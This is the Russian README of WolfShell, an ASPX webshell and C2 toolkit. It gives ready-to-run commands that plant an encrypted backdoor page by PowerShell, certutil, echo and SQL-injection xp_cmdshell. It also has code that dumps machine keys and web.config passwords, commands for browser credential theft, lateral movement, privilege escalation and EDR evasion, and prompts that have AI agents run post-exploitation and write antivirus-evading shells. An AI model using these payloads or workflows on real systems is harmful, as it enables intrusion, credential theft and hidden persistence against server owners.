![WolfShell](wolfshell.jpg)

[![Author](https://img.shields.io/badge/Author-0x7556-blueviolet)](https://github.com/0x7556) 
[![WolfShell](https://img.shields.io/badge/WolfShell-Bin-ff69b4)](https://github.com/0x7556/wolfshell/releases) 
[![GitHub issues](https://img.shields.io/github/issues/0x7556/wolfshell)](https://github.com/0x7556/wolfshell/issues) 
[![Github Stars](https://img.shields.io/github/stars/0x7556/wolfshell)](https://github.com/0x7556/wolfshell) 
[![GitHub forks](https://img.shields.io/github/forks/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
[![GitHub license](https://img.shields.io/github/license/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)

[中文版本](README.md)  |  [English Version](README-EN.md) |  [Русская версия](README-RU.md)

## 🐺 幽狼 · Abyss Wolf

Легенды гласят: в тенях каждой строки кода таится **Волк** из бездны. Он питается **брошенными байтами** и вьет гнезда из **сломанных протоколов**. Никто не видел его истинного облика, ибо его **когти не оставляют следов в журналах логов**. Он не гонится за светом и не воет на ветру, он ждет лишь **приоткрытой двери**. Когда **щель излучает слабый свет доступа**, WolfShell **является безмолвно** — и тогда **все сигналы затихают, все процессы засыпают**, словно мир не заметил его присутствия. Только пустота помнит: **Волк прибыл, и царит тишина.**

---

## WolfShell: Первый продвинутый WebShell и инструмент управления C2 с поддержкой AI

WolfShell (幽狼) — это продвинутый **WebShell** и инструмент управления **C2**, созданный для среды Microsoft **.NET/ASPX**, предназначенный для исследований в области безопасности и тестирования на проникновение ( **Red Teaming** ). Он предоставляет мощные возможности **выполнения команд**, **повышения привилегий** и **проникновения во внутреннюю сеть**; содержит встроенный набор инструментов для пентеста и интегрирует **AI-интеллектуальную помощь при проникновении**, поддерживая **загрузку в память** и операции **без сохранения на диск**, что обеспечивает **высокую скрытность** при проникновении во внутреннюю сеть и гибкое расширение.

## 🚀 Ключевые преимущества
*   **AI-интеллектуальное проникновение:** Поддержка управления операциями WebShell с помощью естественного языка через AI для выполнения команд и проникновения.
*   **Эффективная и скрытная связь:** Протокол передачи **двоичного потока**, обеспечивающий эффективность и скрытность связи.
*   **Сквозное шифрование:** Все передаваемые Payload защищены шифрованием **AES**, каждый сеанс связи использует **случайный ключ**, гарантируя безопасность данных.
*   **Бесследная работа:** Поддержка загрузки и выполнения кода непосредственно в **памяти**, что минимизирует следы на диске, значительно повышая скрытность и безопасность операций.
*   **Каскадное управление WebShell внутренней сети:** Через существующий контролируемый WebShell можно подключаться и управлять WebShell в более глубоких сегментах внутренней сети без развертывания прокси или настройки проброса портов.
*   **Пост-эксплуатация (Hacking):** Загрузка инструментов проникновения в память через контролируемый WebShell, что позволяет эффективное горизонтальное перемещение по внутренней сети без прокси или проброса портов.
*   **Языковые характеристики:** Серверная часть (webshell) и payload написаны исключительно на английском языке. Только предоставленные варианты файлов WebShell содержат английский, японский и корейский языки.

## 🔥 Функциональные возможности

*   **Shell:** Поддержка 9 типов: [ASPX](shell/aspx), [ASHX](shell/ashx), ASMX, [Memory Shell](shell/mem), [EXE](shell/wolf.cs), [PowerShell](shell/wolf.ps1), DLL, MSbuild, ysoserial (десериализация).
*   **Прямой шелл (Forward Shell):** Поддержка внедрения бэкдора на персональную машину для каскадного управления всей внутренней сетью, [EXE](shell/wolf.cs), [PS1](shell/wolf.ps1), DLL, MSbuild и т. д., поддержка повторного использования портов IIS.
*   **Memory Shell:** ASPX с возможностью однократного инжектирования в память. Доступ по любому пути, адрес соединения shell можно менять при каждом подключении для усложнения анализа Blue Team.
*   **Выполнение CMD:** Прямое выполнение любых команд CMD на целевой системе. Модифицированный `whoami` для предотвращения записи и блокировки со стороны EDR.
*   **Управление файлами:** Перечисление директорий, создание файлов, загрузка, исполнение EXE, переименование, удаление, изменение времени файлов на целевой системе.
*   **Выполнение PowerShell:** Поддержка исполнения кода и команд PowerShell. Модифицированный `whoami` для предотвращения записи и блокировки со стороны EDR.
*   **Выполнение Shellcode:** Прямое исполнение нативного Shellcode в целевой среде, быстрая интеграция с Cobalt Strike, Metasploit в один клик.
*   **Выполнение .NET программ:** Поддержка загрузки в память и исполнения пользовательских .NET сборок, быстрое расширение возможностей пост-эксплуатации.
*   **Сканер загрузки в память:** Разработка .NET программы для одного IP превращает её в сканер подсети (C-segment) с загрузкой в память.
*   **Выполнение кода C#:** Динамическая загрузка и выполнение кода C#, копирование примеров, модификация с помощью AI для быстрого расширения боевого потенциала.
*   **ValidationKey:** Извлечение ValidationKey, Validation, DecryptionKey и др. для десериализации ViewState.
*   **Чтение web.config:** Извлечение информации о подключении к БД (имя БД, пользователь, пароль), пароли SMTP/почтовых серверов.
*   **Проброс портов:** Маппинг локального порта на удаленный хост во внутренней сети для безопасного доступа к внутренним сервисам.
*   **HTTP прокси:** Инжекция в память высокопроизводительного HTTP-туннеля Suo5 в один клик.
*   **EfsPotato:** Повышение привилегий через уязвимости системных служб.
*   **BadPotato:** Повышение привилегий через уязвимости системных служб.
*   **Каскадное выполнение CMD:** Поддержка каскадного подключения к WebShell 2-го уровня во внутренней сети для выполнения CMD и горизонтального перемещения.
*   **Каскадное выполнение PowerShell:** Поддержка каскадного подключения к WebShell 2-го уровня во внутренней сети для выполнения PowerShell и горизонтального перемещения.
*   **SshCmd:** Удаленное выполнение команд SSH, поддержка выполнения команд, загрузки/выгрузки файлов на хостах внутренней сети для горизонтального перемещения.
*   **MysqlCmd:** Подключение к базе данных MySQL, выполнение запросов, импорт/экспорт.
*   **MssqlCmd:** Подключение к SQL Server, выполнение запросов, импорт/экспорт, горизонтальное перемещение, выполнение команд, повышение привилегий (Potato).
*   **SharpWeb:** Инструмент сбора учетных данных браузера, извлечение сохраненных логинов/паролей Chrome, Firefox, Edge.
*   **Чтение паролей:** IISpwd, wifipwd, FileZillaPwd, firefoxpwd, XshellPwd, GetPwd, FirefoxHistory, FirefoxCookie.
*   **Обнаружение уязвимостей:** MS17010, SMBGhost, HikvisionPoc, ActivemqPoc, Struts2Poc, WeblogicPoc, CVE-2022-36537, CVE-2024-47176, CVE-2022-27925, CVE-2024-27956.
*   **Инструменты горизонтального перемещения:** wshell, SmbExec, WmiExec, WmiExec2, AtExec, MssqlCmd, MmcExec, ShellExec, ShellBrowserExec.
*   **AI Evasion (Обход защиты):** Использование AI для обхода защит WebShell. Чат позволяет создать WebShell, не определяемый антивирусами.
*   **Ladon:** Набор инструментов для пентеста внутренней сети, безфайловая загрузка из памяти, включает сканирование портов, обнаружение активов, аудит паролей, уязвимости, эксплойты, горизонтальное перемещение (интеграция в процессе, реализовано 10+ протоколов, остальные модули могут требовать исходных утилит).
*   **AddUser:** Обход EDR\XDR для добавления системных пользователей, администраторов, доменных пользователей и администраторов домена.
*   **NoPowerShell:** Выполнение команд PowerShell, кода и файлов при отключенном или отсутствующем PowerShell.

## Вспомогательные функции

### AI (Искусственный интеллект)

*   **AI Evasion (Обход защиты):** Использование AI для обхода защит WebShell. Чат позволяет создать WebShell, не определяемый антивирусами.
*   **AI Проникновение:** Встроенный MCP сервер, управление пост-эксплуатацией AI через естественный язык.

### Шифрование/Дешифрование

*   **Поддерживаемые алгоритмы шифрования:** BASE64, HEX, ASCII, PowerShell, MD5, SHA1, SHA256, URL-кодирование.
*   **Поддерживаемые алгоритмы дешифрования:** BASE64, HEX, ASCII, PowerShell, URL-кодирование.

## Установка и использование

1. **Загрузите WolfShell**
```bash
git clone https://github.com/0x7556/wolfshell.git
```

2. **Целевое окружение**
   - Убедитесь, что целевое окружение поддерживает скрипты ASPX, ASHX, ASMX.
   - .NET >= 3.5, Windows 7 - Windows 2026

3. **Загрузите WolfShell на сервер**
   - Загрузите файлы WolfShell на целевой сервер. Клиент поддерживает генерацию ASPX, ASHX, Memory Shell и других 9 типов.
   - WebShell скрипты: https://github.com/0x7556/wolfshell/tree/main/shell

4. **Доступ к WebShell**
   - Подключитесь к WebShell через клиент инструмента. Пароль по умолчанию: `WolfShell`. Для смены пароля используйте шифрование WolfHash в инструменте.

## Требования к окружению

### Клиент
- **Операционная система:** Windows 7 - Windows 2026
- **Версия .NET:** .NET Framework 4.8

### Shell
- **Операционная система:** Windows 7 - Windows 2026
- **Версия .NET:** >= .NET Framework 3.5

## Универсальные команды GetShell через уязвимости

При наличии командного выполнения или SQL-инъекции, можно записать WebShell WolfShell с помощью следующих 6 методов:
![exeloader](img/ShellBuild.png)

### Запись WebShell wolf.aspx через PowerShell

```bash
powershell -Command "Set-Content -Path 'wolf.aspx' -Value '<%@ Page Language=\"C#\" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(\"ca63457538b9b1e0\"); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"K\").Equals(this); }%>'"
```
### Запись WebShell wolf.aspx через PowerShell (Base64)

```bash
powershell -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgB3AG8AbABmAC4AYQBzAHAAeAAiACAALQBWAGEAbAB1AGUAIAAnADwAJQBAACAAUABhAGcAZQAgAEwAYQBuAGcAdQBhAGcAZQA9ACIAQwAjACIAIAAlAD4APAAlAGkAZgAgACgAUgBlAHEAdQBlAHMAdAAuAEMAbwBvAGsAaQBlAHMALgBDAG8AdQBuAHQAIAAhAD0AIAAwACkAIAB7ACAAYgB5AHQAZQBbAF0AIABrACAAPQAgAEUAbgBjAG8AZABpAG4AZwAuAEQAZQBmAGEAdQBsAHQALgBHAGUAdABCAHkAdABlAHMAKAAiAGMAYQA2ADMANAA1ADcANQAzADgAYgA5AGIAMQBlADAAIgApADsAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtACAAcwAgAD0AIABSAGUAcQB1AGUAcwB0AC4ASQBuAHAAdQB0AFMAdAByAGUAYQBtADsAIABiAHkAdABlAFsAXQAgAGMAIAA9ACAAbgBlAHcAIABiAHkAdABlAFsAcwAuAEwAZQBuAGcAdABoAF0AOwAgAHMALgBSAGUAYQBkACgAYwAsACAAMAAsACAAYwAuAEwAZQBuAGcAdABoACkAOwAgAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQAuAEwAbwBhAGQAKABuAGUAdwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAAoACkALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoAGsALAAgAGsAKQAuAFQAcgBhAG4AcwBmAG8AcgBtAEYAaQBuAGEAbABCAGwAbwBjAGsAKABjACwAIAAwACwAIABjAC4ATABlAG4AZwB0AGgAKQApAC4AQwByAGUAYQB0AGUASQBuAHMAdABhAG4AYwBlACgAIgBLACIAKQAuAEUAcQB1AGEAbABzACgAdABoAGkAcwApADsAIAB9ACUAPgAnAA==
```

### Запись WebShell wolf.aspx через CMD (echo & certutil)

```bash
echo 3c25402050616765204c616e67756167653d2243232220253e3c2569662028526571756573742e436f6f6b6965732e436f756e7420213d203029207b20627974655b5d206b203d20456e636f64696e672e44656661756c742e476574427974657328223961613337623163323561303834653022293b2053797374656d2e494f2e53747265616d2073203d20526571756573742e496e70757453747265616d3b20627974655b5d2063203d206e657720627974655b732e4c656e6774685d3b20732e5265616428632c20302c20632e4c656e677468293b2053797374656d2e5265666c656374696f6e2e417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528224b22292e457175616c732874686973293b207d253e > w.hex && certutil -f -decodehex w.hex wolf.aspx && del w.hex
```

### Запись WebShell wolf.aspx через CMD (echo)

```bash
echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) { >> wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); >> wolf.aspx && echo System.IO.Stream s = Request.InputStream; >> wolf.aspx && echo byte[] c = new byte[s.Length]; >> wolf.aspx && echo s.Read(c, 0, c.Length); >> wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); >> wolf.aspx && echo } %^> >> wolf.aspx
```

### Запись WebShell wolf.aspx через SQL инъекцию (xp_cmdshell)

```bash
'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) {>> C:\inetpub\wwwroot\wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0");>> C:\inetpub\wwwroot\wolf.aspx && echo System.IO.Stream s = Request.InputStream;>> C:\inetpub\wwwroot\wolf.aspx && echo byte[] c = new byte[s.Length];>> C:\inetpub\wwwroot\wolf.aspx && echo s.Read(c, 0, c.Length);>> C:\inetpub\wwwroot\wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this);>> C:\inetpub\wwwroot\wolf.aspx && echo } %^> >> C:\inetpub\wwwroot\wolf.aspx'; --
```

### Компиляция EXE (Прямой C2)
```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:wolf.exe wolf.cs
```
P.S.: Можно модифицировать, добавить в автозагрузку для персистентности, комбинировать с каскадными функциями для горизонтального перемещения по сети. Также можно преобразовать код в DLL и через DLL Hijacking каскадно управлять несколькими машинами.

### PowerShell (Прямой C2)
```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File wolf.ps1
```
### Бэкдор с повторным использованием портов IIS

Если на цели установлен IIS, оба варианта (PowerShell и EXE) поддерживают повторное использование портов.

## Примеры функций

### Выполнение пользовательских .NET программ

Выполнение .NET: Поддержка загрузки в память и исполнения пользовательских .NET сборок для быстрого расширения возможностей пост-эксплуатации.
![exeloader](img/ExeLoader.png)

# AI (Искусственный интеллект)

## AI Evasion (Интеллектуальный обход защиты) 
Использование ИИ для обхода защиты на сервере WolfShell WebShell.
![aicode](img/aicode.png)

## AI Проникновение

 ### Конфигурация Cherry Studio MCP

 ```json
  "mcpServers": {
    "xf5pBIECy50rKmx53Gy7n": {
      "name": "WolfShellMCP",
      "type": "stdio",
      "description": "",
      "isActive": true,
      "command": "C:\\Users\\Administrator\\Downloads\\wolfshell-main\\WolfShellMCP.exe",
      "args": [],
      "env": {
        "WOLFSHELL_API": "http://127.0.0.1:7556"
      }
    }
```

* Принцип работы аналогичен для других клиентов. Приветствуется код конфигурации для других клиентов. Кроссплатформенный MCP поддерживает Windows/Linux/MacOS.
* В Kali скачайте версию `lnx`. Установите переменную окружения `WOLFSHELL_API` на адрес удаленного API машины с WolfShell под Windows.
* WolfShell AI Shell MCP: https://github.com/0x7556/PentestMCP/releases/tag/wolfshellmcp3.4

### Запуск API сервера AI
В инструменте WolfShell Shell перейдите в вкладку "AI->MCP", найдите кнопку "API MCP Server"
![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShell_API.png)

### 1. AI Проникновение: Выполнение CMD через Shell (адрес и пароль)  
В связке с уязвимостями позволяет AI автоматически получать шелл. Успешное выполнение команды является критерием проверки успешного GetShell, предотвращая галлюцинации AI или ложные срабатывания на статус 200.
**Пример промпта:**

- Используй WolfShell http://192.168.50.106/shell.aspx Wolf8888 для выполнения CMD команды: whoami
- Используй WolfShell http://192.168.1.11/wolf.aspx WolfShell для выполнения CMD команды: просмотреть информацию о системе

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpCmd.png)

### 2. AI Проникновение: Выполнение CMD через ID Shell (преднастроенный в клиенте)  
Преимущество: Не раскрывает адрес и пароль целевого Shell для AI.
**Пример промпта:**
- Используй WolfShell Shell с ID 9 для выполнения CMD команды: просмотреть текущего пользователя

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpCmdID.png)

### 3. AI Проникновение: Выполнение PowerShell через Shell (адрес и пароль)  
**Пример промпта:**
- Используй WolfShell http://192.168.1.11/wolf.aspx WolfShell для выполнения команды PowerShell: whoami  
- Используй WolfShell http://192.168.1.11/wolf.aspx WolfShell для выполнения команды PowerShell: просмотреть информацию о системе

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpCmdWhoami.png)

### 4. AI Проникновение: Выполнение PowerShell через ID Shell 
Преимущество: Не раскрывает адрес и пароль целевого Shell для AI.
**Пример промпта:**
- Используй WolfShell Shell с ID 9 для выполнения команды PowerShell: ipconfig  
- Используй WolfShell Shell с ID 9 для выполнения команды PowerShell: просмотреть текущий IP

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpPS1.png)

### 5. Видео демонстрация AI Проникновения (WolfShell)
https://github.com/0x7556/hackvideo/blob/main/Wolf%20AI%20Shell.mov

### 6. AI Проникновение: Загрузка файла через WolfShell

**Пример промпта:**
- Используй WolfShell http://192.168.50.106/shell.aspx Wolf8888 для загрузки файла C:\Users\Administrator\Desktop\TestTest\wolf.exe в директорию Public цели.
- Используй WolfShell ID 9 для загрузки файла C:\Users\Administrator\Desktop\TestTest\wolf.exe в директорию Public цели.

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_uploadfile.png)

### 7. AI Проникновение: Повышение привилегий (EfsPotato)

**Пример промпта:**
- Используй WolfShell ID 9 для выполнения EfsPotato: whoami
- Используй WolfShell http://192.168.50.106/shell.aspx Wolf8888 EfsPotato: whoami

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_efspotato.png)

### 8. AI Проникновение: Повышение привилегий (BadPotato)

**Пример промпта:**
- Используй WolfShell ID 9 для выполнения BadPotato: whoami
- Используй WolfShell http://192.168.50.106/shell.aspx Wolf8888 BadPotato: whoami

![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_badpotato.png)

## Каскадное управление Shell и C2 внутренней сети

### Каскадное выполнение CMD через WebShell 3-го уровня 

Через точку входа 192.168.50.106 подключение к внутренней сети 192.168.50.159, далее к следующему сегменту 192.168.50.69 WebShell для выполнения команд.

P.S.: Это также работает для внешней сети. Например, если захвачены серверы в качестве плацдарма, а реальная цель находится на 3-м уровне, это усложняет отслеживание вашего реального IP.

![CmdShell пример](img/Lan2CmdShell.png)

### Каскадное выполнение CMD через WebShell 2-го уровня

Через точку входа 192.168.50.159 подключение к 192.168.50.106 WebShell для выполнения команд.

![CmdShell пример](img/LanCmdShell.png)

### Выполнение CMD через точку входа WebShell

![CmdShell пример](img/CmdShell.png)

### Выполнение PowerShell команд/кода через точку входа WebShell
* `whoami` реализован не через стандартный системный whoami.
* Поддерживает выполнение команд, кода, длина до 9K.
* Введите `info` или `ver` для просмотра версии ОС, разрядности, версий .NET и PowerShell.
* Введите `whoami`, `username` для автоматической конвертации в PowerShell код для просмотра информации о пользователе.
* Пример выполнения Base64 кода: `base64:ZWNobyBXb2xmU2hlbGw=`

```csharp
PS C:\Users\admin>whoami
whoami: IIS APPPOOL\DefaultAppPool
Username: WIN-021V7TK43N5$

PS C:\Users\admin>info
Operating System Version: Microsoft Windows Server 2019 Datacenter 64 bit
Version Number: 10.0.17763

PowerShell Version:
5.1.17763.1

.NET Detailed Versions:
PSChildName Version   Release
----------- -------   -------
Client      4.7.03190  461814

PS C:\Users\admin>base64:ZWNobyBXb2xmU2hlbGw=
WolfShell

PS C:\Users\admin>Write-Host "Current User:`n$env:USERNAME"
Current User:
WIN-021V7TK43N5$
```

![PowerShell пример](img/PowerShell.png)

### Управление файлами

![FileMgr](img/FileMgr.png)

### Выполнение кода C#

#### Пример получения ValidationKey

*   ValidationKey: Извлечение ValidationKey, Validation, DecryptionKey для десериализации ViewState.

```csharp

using System;
using System.Reflection;
using System.Web.Configuration;
public class Eval
{
public string eval(Object obj)
{
var sy = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Validation + " | " + "DecryptionKey: " + cg.DecryptionKey + " | " + "Decryption: " + cg.Decryption + " | " + "CompatibilityMode: " + cg.CompatibilityMode;
}
}

```

![Пример кода C#](img/CodeViewKey.png)

#### Пример кода сканирования подсети (C-Segment)
```csharp

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
public class Eval
{
public string eval(Object obj)
{
StringBuilder iplist = new StringBuilder();
string baseIP = "192.168.1.";
PingOptions options = new PingOptions();
options.DontFragment = true;
var tasks = new Task[254];
for (int i = 1; i < 255; i++)
{
int ipSuffix = i;
tasks[i - 1] = Task.Run(() =>
{
using (Ping myPing = new Ping())
{
PingReply reply = myPing.Send(baseIP + ipSuffix, 120);
if (reply.Status == IPStatus.Success)
{
lock (iplist)
{
iplist.AppendLine("Alive IP: " + reply.Address.ToString());
}
}
}
});
}
Task.WaitAll(tasks);
return iplist.ToString();
}
}

```

![Пример кода C#](img/CodeCping.png)

#### Пример выполнения команд CMD
```csharp

using System;
using System.Diagnostics;
public class Eval
{
public string eval(Object obj)
{
try
{
Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c whoami";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
string result = process.StandardOutput.ReadToEnd();
process.WaitForExit();
return result;
}
catch (Exception ex)
{
return "Error occurred: " + ex.Message;
}
}
}

```

![Пример кода C#](img/CodeCmd.png)

#### Пример получения паролей из web.config

*   Чтение web.config: Извлечение информации о подключении к БД, SMTP.

```csharp

using System;
using System.Configuration;
using System.Text;
public class Eval
{
public string eval(Object obj)
{
try
{
var connectionStrings = ConfigurationManager.ConnectionStrings;
var appSettings = ConfigurationManager.AppSettings;
var result = new StringBuilder();
foreach (ConnectionStringSettings connectionString in connectionStrings)
{
result.AppendLine("Connection string name: " + connectionString.Name);
result.AppendLine("Connection string value: " + connectionString.ConnectionString);
result.AppendLine();
}
result.AppendLine();
foreach (string key in appSettings.AllKeys)
{
result.AppendLine("Key: " + key + ", Value: " + appSettings[key]);
}
return result.ToString();
}
catch (Exception ex)
{
return "Error occurred: " + ex.Message;
}
}
}

```

![Пример кода C#](img/CodeWebConfig.png)

### Алгоритмы шифрования/дешифрования

Шифрование: BASE64, HEX, ASCII, PowerShell, MD5, SHA1, SHA256, URL-кодирование
Дешифрование: BASE64, HEX, ASCII, PowerShell, URL-кодирование

#### Пароль WolfHash

![WolfHash](img/WolfHash.png)

#### Шифрование ASCII

![WolfShell](img/ascii.png)

#### Дешифрование BASE64

![WolfShell](img/unBase64.png)

#### Дешифрование HEX

![WolfShell](img/unhex.png)

### Примеры повышения привилегий Potato

#### EfsPotato

![EfsPotato пример](img/EfsPotato.png)

#### BadPotato

![BadPotato пример](img/BadPotato.png)

### Пример сканирования внутренней сети

![NetScan пример](img/NetScan.png)

### Пример проброса портов

![Пример проброса портов](img/PortTran.png)

### Пример HTTP прокси

![Пример проброса портов](img/Suo5Tunnel.png)

## Пост-эксплуатация (Hacking)

### Пример удаленного выполнения команд SSH

```bash
Usage:

sshcmd 192.168.50.128 22 root toor id
sshcmd 192.168.50.128 22 root toor download /tmp/down.rar c:\down.rar
sshcmd 192.168.50.128 22 root toor upload c:\upload.rar /tmp/upload.rar

Keybord
sshcmd 192.168.50.128 22 root toor download2 /tmp/down.rar c:\down.rar
sshcmd 192.168.50.128 22 root toor upload2 c:\upload.rar /tmp/upload.rar
```

![Hacking](img/sshcmd.png)

### Пример подключения к базе данных MySQL

```bash
mysqlcmd host port user pass dbname sqlstr
mysqlcmd host port user pass dbname sqlb64

Demo:
mysqlcmd 192.168.50.139 3306 root WolfShell mysql info
mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT VERSION(); ""
mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT 3+5 ""
mysqlcmd 192.168.50.139 3306 root WolfShell mysql c2VsZWN0IDMrNQ==";
```

![Hacking](img/mysqlcmd.png)

### Пример чтения паролей браузера

*   SharpWeb: Инструмент сбора учетных данных Chrome, Firefox, Edge.

```bash
Usage:
    SharWeb arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chrome, FireFox and IE/Edge credentials.
    full      - The same as 'all'
    chrome    - Fetch saved Chrome logins. e.g. -d Directory
    firefox   - Fetch saved FireFox logins. e.g. -p masterkey -d Directory
    edge      - Fetch saved Internet Explorer/Microsoft Edge logins.

Demo:
    SharWeb all
    SharWeb chrome
    SharWeb chrome -d C:\Output
    SharWeb firefox -p mymasterkey -d C:\Output
    SharWeb edge
=======================================================================
```

![Hacking](img/SharpWeb.png)

### Инструменты Ladon для внутренней сети
(20251106 Основные функции интеграции: сканирование выживает, другое не поддерживается)

```bash
Usage:

Ladon whoami

Ladon 192.168.50.159/24 ICMP         ICMP анализ выживаемости
Ladon 192.168.50.159/24 PortScan     Сканирование открытых портов
Ladon 192.168.50.159/24 WebScan      Заголовки и middleware сайтов

Ladon 192.168.50.159/24 SmbInfo      SMB анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 NbtInfo      NBT анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 WmiInfo      WMI анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 LdapInfo     LDAP анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 RdpInfo      RDP анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 SmtpInfo     SMTP анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 HttpInfo     HTTP анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 WinrmInfo    Winrm анализ выживаемости, NTLM информация
Ladon 192.168.50.159/24 MssqlInfo    SQL Server анализ выживаемости, NTLM информация

Ladon 192.168.50.159/24 FtpInfo      FTP анализ выживаемости
Ladon 192.168.50.159/24 T3Info       Weblogic протокол
Ladon 192.168.50.159/24 CiscoInfo    Cisco маршрутизаторы
Ladon 192.168.50.159/24 SnmpInfo     SNMP устройства (маршрутизаторы, коммутаторы)

Ladon 192.168.50.159/24 OxidInfo     Windows хосты с несколькими сетевыми адаптерами
Ladon 192.168.50.159/24 EthInfo      Windows хосты с несколькими сетевыми адаптерами
Ladon http://0x7556.org WPinfo       WordPress версия, плагины, уязвимости
Ladon 192.168.50.159/24 DnsInfo      DNS анализ выживаемости, определение доменов

```

#### Идентификация ОС через SMB NTLM
![Hacking](img/SmbInfo.png)

#### Сканирование заголовков и middleware (WebScan)
![Hacking](img/WebScan.png)

### Пример сканирования портов

```bash

PortScan 192.168.50.159
PortScan 192.168.50.159 80,22,135,445

```

![Hacking](img/PortScan.png)

## Обнаружение уязвимости MS17010

![WolfShell](img/ms17010.png)

## Горизонтальное перемещение через SQL Server / Повышение привилегий БД

![WolfShell](img/MssqlCmd.png)

## Чтение паролей Xshell

![WolfShell](img/XshellPwd.png)

## Чтение паролей webkey

Анализ web.config для получения ValidationKey (бэкдор ViewState для Exchange, SharePoint)

![WolfShell](img/webkey.png)

## Эксплуатация CVE-2025-55182 Next.js RCE
[+] CVE-2025-55182: Эксплуатация уязвимости RCE в Next.js.
[+] NextJSexp: Эксплуатация уязвимости RCE в Next.js.

![WolfShell](img/nextjsexp.png)

## Обнаружение уязвимости CVE-2026-48907 Joomla JCE Editor RCE
[+] CVE-2026-48907 http://target.com

![WolfShell](img/CVE-2026-48907.png)

## Локальное использование EXP

Используйте утилиты Hacking (EXP) локально. Запустите `HackTest.exe`, добавьте Shell: `http://127.0.0.1:8080/wolfshell`.
Правый клик -> Инструменты пост-эксплуатации -> Выберите EXP -> Появится справка, введите команду в текстовое поле.

## Загрузка сканеров в память

### Сканер загрузки в память
* Программа для одного IP превращается в сканер подсети с загрузкой в память.
* Убедитесь, что классы и методы в инструменте имеют модификатор `public`.

#### Оригинальное использование
```bash
F:\py>urltitle.exe 192.168.50.1
URL: http://192.168.50.1/ | Status: 200 | Banner: httpd/2.0 | Title: No Title
```

#### Удаленная загрузка в память -> Сканер подсети
1. Перетащите EXE в поле "ExePath".
2. Введите подсеть в поле "C сегмент" (например, 192.168.1.0/24).
3. Нажмите "Scan".
- Сканер сначала проверяет пинг (ICMP). Если ICMP отключен, снимите галочку "Предварительное обнаружение".
-- 
![image](https://github.com/0x7556/wolfshell/blob/main/img/memLoadScan.png)

#### Встроенный сканер MS17010
![image](https://github.com/0x7556/wolfshell/blob/main/img/memLoadScan_ms17010.png)

## Отказ от ответственности

- При использовании WolfShell соблюдайте действующее законодательство и проводите тестирование только в авторизованной среде.
- Инструмент предоставляется исключительно для образовательных и исследовательских целей. Любое ненадлежащее использование преследуется по закону.

## Обратная связь

Приветствуем любой вклад! Пожалуйста, сообщайте об ошибках, предлагайте улучшения или создавайте Pull Request.

## Лицензия

Проект распространяется под лицензией MIT. Подробности см. в файле [LICENSE](LICENSE).

## Ресурсные ссылки

Интегрированные или планируемые инструменты (загрузка в память, некоторые могут иметь проблемы совместимости, например SweetPotato\GodPotato, их может потребоваться запускать вручную):

